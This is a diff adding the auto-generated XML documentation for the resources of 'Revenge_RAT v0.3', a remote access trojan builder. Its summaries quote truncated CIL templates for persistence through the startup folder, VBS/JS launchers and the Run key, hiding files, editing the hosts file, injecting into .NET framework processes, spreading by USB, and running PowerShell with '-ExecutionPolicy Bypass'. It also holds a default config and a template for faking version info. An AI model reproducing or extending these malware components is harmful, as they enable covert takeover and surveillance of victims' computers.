@@ -1,0 +1,1358 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+Revenge_RAT v0.3
+</name>
+</assembly>
+<members>
+<member name="T:Revenge_RAT_v0._3.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._10">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._11">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1472450092_mouse_add">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1472450093_mouse">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1472451891_keyboard">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1472451892_keyboard_add">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1472453348_save">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1472453350_save_add2">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1473000728_full_screen">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1473000774_FullscreenExit">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1476121459_application">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1477596916_resultset_next">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1477596924_Stop">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1478078554_webcam_add">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1478078555_webcam_delete">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1480588346_folder">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1481030115_Opera">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1481030260_thunderbird_icon">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._1481204153_error">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._2">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._3">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._4">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._5">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._6">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._77">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._8">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._9">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources._Default">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.AppBigIcon">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Binder">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0411:  nop
+      IL_0412:  ldstr      &quot;%Bytes%&quot;
+      IL_0417:  ldstr      &quot;|_RVR_|&quot;
+      IL_041c:  ldc.i4.m1
+      IL_041d:  ldc.i4.0
+      IL_041e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
+                                                                                                string,
+                                                                                                int32,
+                                    [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.BinderUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0468:  nop
+      IL_0469:  ldstr      &quot;%Bytes%&quot;
+      IL_046e:  ldstr      &quot;|_RVR_|&quot;
+      IL_0473:  ldc.i4.m1
+      IL_0474:  ldc.i4.0
+      IL_0475:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
+                                                                                                string,
+                                                                                                int32,
+                                    [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Black_Currant">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ComplexCall">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_05ad:  nop
+      IL_05ae:  ldarg.0
+      IL_05af:  ldftn      instance void Nuclear_Explosion.Atomic::Complex_Method()
+      IL_05b5:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
+                                                                                       native int)
+      IL_05ba:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
+      IL_05bf:  stloc.s    V_14
+      IL_0 [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ComplexCallUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_063d:  nop
+      IL_063e:  ldarg.0
+      IL_063f:  ldftn      instance void Nuclear_Explosion.Atomic::Complex_Method()
+      IL_0645:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
+                                                                                       native int)
+      IL_064a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
+      IL_064f:  stloc.s    V_14
+      IL_0 [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ComplexMethod">
+<summary>
+  Looks up a localized string similar to .method public instance void  Complex_Method() cil managed
+  {
+    // Code size       944 (0x3b0)
+    .maxstack  14
+    .locals init (string V_0,
+             string V_1,
+             int32 V_2,
+             string V_3,
+             bool V_4,
+             bool V_5,
+             bool V_6,
+             bool V_7,
+             bool V_8,
+             bool V_9,
+             string[] V_10,
+             int32 V_11,
+             string V_12,
+             bool V_13,
+             bool V_14,
+         [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ComplexMethodUSB">
+<summary>
+  Looks up a localized string similar to .method public instance void  Complex_Method() cil managed
+  {
+    // Code size       1010 (0x3f2)
+    .maxstack  26
+    .locals init (int32 V_0,
+             string V_1,
+             bool V_2,
+             string V_3,
+             string V_4,
+             bool V_5,
+             bool V_6,
+             bool V_7,
+             bool V_8,
+             bool V_9,
+             string[] V_10,
+             int32 V_11,
+             string V_12,
+             bool V_13,
+             bool V_14,
+        [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Config">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Rev&gt;
+&lt;Socket_Key&gt;
+&lt;![CDATA[Revenge-RAT]]&gt;
+&lt;/Socket_Key&gt;
+&lt;Connections_Port&gt;
+&lt;![CDATA[333]]&gt;
+&lt;/Connections_Port&gt;
+&lt;Minimizing&gt;
+&lt;![CDATA[True]]&gt;
+&lt;/Minimizing&gt;
+&lt;Listening&gt;
+&lt;![CDATA[False]]&gt;
+&lt;/Listening&gt;
+&lt;Ping&gt;
+&lt;![CDATA[15]]&gt;
+&lt;/Ping&gt;
+&lt;Visual&gt;
+&lt;![CDATA[True]]&gt;
+&lt;/Visual&gt;
+&lt;Notification&gt;
+&lt;![CDATA[False]]&gt;
+&lt;/Notification&gt;
+&lt;Sound&gt;
+&lt;![CDATA[False]]&gt;
+&lt;/Sound&gt;
+&lt;Desktop&gt;
+&lt;![CDATA[True]]&gt;
+&lt;/Desktop&gt;
+&lt;DesktopValue&gt;
+&lt;![CDATA[2]]&gt;
+&lt;/DesktopValue&gt;
+&lt;Webcam&gt;
+ [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyClient">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_00d2:  nop
+      IL_00d3:  ldstr      &quot;%DFN%&quot;
+      IL_00d8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
+      IL_00dd:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_00e2:  ldstr      &quot;\\%DN%&quot;
+      IL_00e7:  call       string [mscorlib]System.String::Concat(string,
+                                                                  stri [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyClientUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_00ed:  nop
+      IL_00ee:  ldstr      &quot;%DFN%&quot;
+      IL_00f3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
+      IL_00f8:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_00fd:  ldstr      &quot;\\%DN%&quot;
+      IL_0102:  call       string [mscorlib]System.String::Concat(string,
+                                                                  stri [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyCodeDomStartup">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0330:  nop
+      IL_0331:  newobj     instance void [System]Microsoft.VisualBasic.VBCodeProvider::.ctor()
+      IL_0336:  callvirt   instance class [System]System.CodeDom.Compiler.ICodeCompiler [System]Microsoft.VisualBasic.VBCodeProvider::CreateCompiler()
+      IL_033b:  newobj     instance void [System]System.CodeDom.Compiler.CompilerParameters::.ctor()
+      IL_0340:  dup
+      IL_0341:  ldstr      &quot;/target:winexe&quot;
+      IL_0346:  callvirt   instance void [System]System.CodeDo [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyCodeDomStartupUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_036f:  nop
+      IL_0370:  newobj     instance void [System]Microsoft.VisualBasic.VBCodeProvider::.ctor()
+      IL_0375:  callvirt   instance class [System]System.CodeDom.Compiler.ICodeCompiler [System]Microsoft.VisualBasic.VBCodeProvider::CreateCompiler()
+      IL_037a:  newobj     instance void [System]System.CodeDom.Compiler.CompilerParameters::.ctor()
+      IL_037f:  dup
+      IL_0380:  ldstr      &quot;/target:winexe&quot;
+      IL_0385:  callvirt   instance void [System]System.CodeDo [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyJS">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_01d5:  nop
+      IL_01d6:  ldc.i4.7
+      IL_01d7:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_01dc:  ldstr      &quot;\\%J%.js&quot;
+      IL_01e1:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_01e6:  ldstr      &quot;var activeXObj = new ActiveXObject(\&quot;Shell.Applicat&quot;
+      + &quot;ion\&quot;);\r\nactiveXObj.ShellExecute(\&quot;&quot;
+ [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyJSUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0202:  nop
+      IL_0203:  ldc.i4.7
+      IL_0204:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_0209:  ldstr      &quot;\\%J%.js&quot;
+      IL_020e:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_0213:  ldstr      &quot;var activeXObj = new ActiveXObject(\&quot;Shell.Applicat&quot;
+      + &quot;ion\&quot;);\r\nactiveXObj.ShellExecute(\&quot;&quot;
+ [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyStartup">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0117:  nop
+      IL_0118:  ldc.i4.7
+      IL_0119:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_011e:  ldstr      &quot;\\%STF%.EXE&quot;
+      IL_0123:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_0128:  stloc.0
+      IL_0129:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_012e:  ldloc.0
+      IL_012 [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyStartupUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0138:  nop
+      IL_0139:  ldc.i4.7
+      IL_013a:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_013f:  ldstr      &quot;\\%STF%.EXE&quot;
+      IL_0144:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_0149:  stloc.1
+      IL_014a:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_014f:  ldloc.1
+      IL_015 [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyVBS">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0153:  nop
+      IL_0154:  ldc.i4.7
+      IL_0155:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_015a:  ldstr      &quot;\\%V%.vbs&quot;
+      IL_015f:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_0164:  ldc.i4.5
+      IL_0165:  newarr     [mscorlib]System.String
+      IL_016a:  dup
+      IL_016b:  ldc.i4.0
+     [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.CopyVBSUsb">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_017a:  nop
+      IL_017b:  ldc.i4.7
+      IL_017c:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_0181:  ldstr      &quot;\\%V%.vbs&quot;
+      IL_0186:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_018b:  ldc.i4.5
+      IL_018c:  newarr     [mscorlib]System.String
+      IL_0191:  dup
+      IL_0192:  ldc.i4.0
+     [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Corduroy">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Dark_Slate_Blue">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Darkness">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.DefaultSettings">
+<summary>
+  Looks up a localized string similar to 127.0.0.1,
+333,
+Guest
+RV_MUTEX
+2500
+False
+0
+Client.exe
+False
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Client
+False
+Client
+1
+False
+Client.exe
+Random
+Default
+Optional
+False
+Client.exe
+False
+Client
+False
+Client
+False
+Client
+False
+Client
+False
+Client.exe
+False
+[System.Reflection.Assembly]::LoadWithPartialName(&apos;System.Windows.Forms&apos;); [System.Windows.Forms.MessageBox]::Show(&apos;Hello World!&apos;,&apos;Hello!&apos;,0,64)
+False
+Installation
+Revenge-RAT client has been succe [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Ebony">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.expand_less_white_24x24">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.expand_more_white_24x24">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.FKMSG">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0027:  nop
+      IL_0028:  ldstr      &quot;%Body%&quot;
+      IL_002d:  ldstr      &quot;%Title%&quot;
+      IL_0032:  ldstr      &quot;%Button%&quot;
+      IL_0037:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
+      IL_003c:  ldstr      &quot;%Icon%&quot;
+      IL_0041:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
+      IL_0046:  call       valuetype [System.Windows.Forms]System.Windows [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.FKMSGUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_002d:  nop
+      IL_002e:  ldstr      &quot;%Body%&quot;
+      IL_0033:  ldstr      &quot;%Title%&quot;
+      IL_0038:  ldstr      &quot;%Button%&quot;
+      IL_003d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
+      IL_0042:  ldstr      &quot;%Icon%&quot;
+      IL_0047:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
+      IL_004c:  call       valuetype [System.Windows.Forms]System.Windows [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Gondola">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.GoRC">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Gray">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.HideFile">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0119:  nop
+      IL_011a:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_011f:  ldc.i4.6
+      IL_0120:  call       void [mscorlib]System.IO.File::SetAttributes(string,
+                                                                        valuetype [mscorlib]System.IO.FileAttributes)
+      IL_0125:  nop
+      IL_0126:  leave.s    IL_0135
+
+    }  // end .try
+    catch [mscorlib]System.Exception 
+    {
+      IL_0128:  call       void [Microsoft.VisualBasic]Microso [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.HideFileUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0137:  nop
+      IL_0138:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_013d:  ldc.i4.6
+      IL_013e:  call       void [mscorlib]System.IO.File::SetAttributes(string,
+                                                                        valuetype [mscorlib]System.IO.FileAttributes)
+      IL_0143:  nop
+      IL_0144:  leave      IL_0159
+
+    }  // end .try
+    catch [mscorlib]System.Exception 
+    {
+      IL_0149:  call       void [Microsoft.VisualBasic]Microso [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.HostsFile">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_04f0:  nop
+      IL_04f1:  ldstr      &quot;%IP%&quot;
+      IL_04f6:  ldstr      &quot;|&quot;
+      IL_04fb:  ldc.i4.m1
+      IL_04fc:  ldc.i4.0
+      IL_04fd:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
+                                                                                                string,
+                                                                                                int32,
+                                             [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.HostsFileUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0566:  nop
+      IL_0567:  ldstr      &quot;%IP%&quot;
+      IL_056c:  ldstr      &quot;|&quot;
+      IL_0571:  ldc.i4.m1
+      IL_0572:  ldc.i4.0
+      IL_0573:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
+                                                                                                string,
+                                                                                                int32,
+                                             [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.HTML">
+<summary>
+  Looks up a localized string similar to &lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+.alert {
+    padding: 20px;
+    background-color: #4a96ba;
+    color: white;
+}
+
+.closebtn {
+    margin-left: 15px;
+    color: white;
+    font-weight: bold;
+    float: right;
+    font-size: 22px;
+    line-height: 20px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.closebtn:hover {
+    color: black;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;alert&quot;&gt;
+  &lt;span class=&quot;closebtn&quot; onclick=&quot;this.parentElement.style.display=&apos;none&apos;;&quot;&gt;&amp;times;&lt;/span&gt;
+  &lt;stron [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.icon">
+<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.info">
+<summary>
+  Looks up a localized string similar to 1 VERSIONINFO
+FILEVERSION %UPFV%
+PRODUCTVERSION %UPPR%
+FILEOS 0x40004
+FILETYPE 0x1
+{
+BLOCK &quot;StringFileInfo&quot;
+{
+	BLOCK &quot;040904b0&quot;
+	{
+		VALUE &quot;CompanyName&quot;, &quot;%Company%&quot;
+		VALUE &quot;FileDescription&quot;, &quot;%Description%&quot;
+		VALUE &quot;FileVersion&quot;, &quot;%Filever%&quot;
+		VALUE &quot;InternalName&quot;, &quot;%Title%.exe&quot;
+		VALUE &quot;LegalCopyright&quot;, &quot;%CopyRights%&quot;
+		VALUE &quot;OriginalFilename&quot;, &quot;%Title%.exe&quot;
+		VALUE &quot;LegalTrademarks&quot;, &quot;%Trade%&quot; 
+		VALUE &quot;ProductName&quot;, &quot;%Product%&quot;
+		VALUE &quot;ProductVersion&quot;, &quot;%Prover%&quot;
+		}
+}
+
+BLOCK &quot;V [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.InjectCall">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0032:  nop
+      IL_0033:  ldstr      &quot;WINDIR&quot;
+      IL_0038:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
+      IL_003d:  ldstr      &quot;\\Microsoft.NET\\Framework\\%IV%\\%PI%&quot;
+      IL_0042:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_0047:  stloc.0
+      IL_0048:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Proces [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.InjectCallUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0038:  nop
+      IL_0039:  ldstr      &quot;WINDIR&quot;
+      IL_003e:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
+      IL_0043:  ldstr      &quot;\\Microsoft.NET\\Framework\\%IV%\\%PI%&quot;
+      IL_0048:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_004d:  stloc.0
+      IL_004e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Proces [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Light_Sea_Green">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Loading">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.mpress">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Night_Fury">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.P">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.PowerShell">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_03f2:  nop
+      IL_03f3:  ldstr      &quot;powershell -ExecutionPolicy Bypass -Command %PSC%&quot;
+      IL_03f8:  ldc.i4.2
+      IL_03f9:  ldc.i4.0
+      IL_03fa:  ldc.i4.m1
+      IL_03fb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
+                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
+                                                [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.PowerShellUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0443:  nop
+      IL_0444:  ldstr      &quot;powershell -ExecutionPolicy Bypass -Command %PSC%&quot;
+      IL_0449:  ldc.i4.2
+      IL_044a:  ldc.i4.0
+      IL_044b:  ldc.i4.m1
+      IL_044c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
+                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
+                                                [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ProcessPro">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0001:  nop
+      IL_0002:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
+      IL_0007:  ldstr      &quot;%PC%&quot;
+      IL_000c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
+      IL_0011:  callvirt   instance void [System]System.Diagnostics.Process::set_PriorityClass(valuetype [System]System.Diagnostics.ProcessPriorityClass)
+      IL_0016:  nop
+      IL_0017:  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ProcessProUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0001:  nop
+      IL_0002:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
+      IL_0007:  ldstr      &quot;%PC%&quot;
+      IL_000c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
